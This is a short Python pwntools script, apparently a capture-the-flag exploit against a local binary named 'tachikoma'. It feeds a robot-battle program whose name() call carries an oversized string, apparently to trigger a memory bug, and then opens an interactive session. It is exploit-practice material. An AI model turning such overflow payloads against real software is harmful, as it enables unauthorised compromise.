from pwn import *
payload = """
AutoScan                    
{
    print( "Hit by missle" )
}

Core
{
    print( "Core" )
    ahead( 1 )
    endturn( )
}  

MissileHit
{
    print( "Hit by missle" )
}

FoundRobot
{
    print( "Find" )
}

Dead
{
}

Pinged
{
    print( "Pinged from" _cldbearing "heading" _cldheading )
}

Init
{
    name( "1111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i111111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i111111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i111111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i111111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i111111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i1111111111111111111111111111111111111111111i1111111111111111111111111111111111i1111111111111111111111111111111111i111111111111111111111111111111111i1111111111111111111" )
    regcore( "Core" )
    regcldmissile( "MissileHit", 1 )
    regdtcrobot( "FoundRobot", 2 )
    regascan( "AutoScan", 3 )
    regping( "Pinged", 1 )
}
"""
p = process("./tachikoma")
raw_input("debug")
p.send("1\n")
p.send("%d\n" % len(payload))
p.send(payload)
p.interactive()
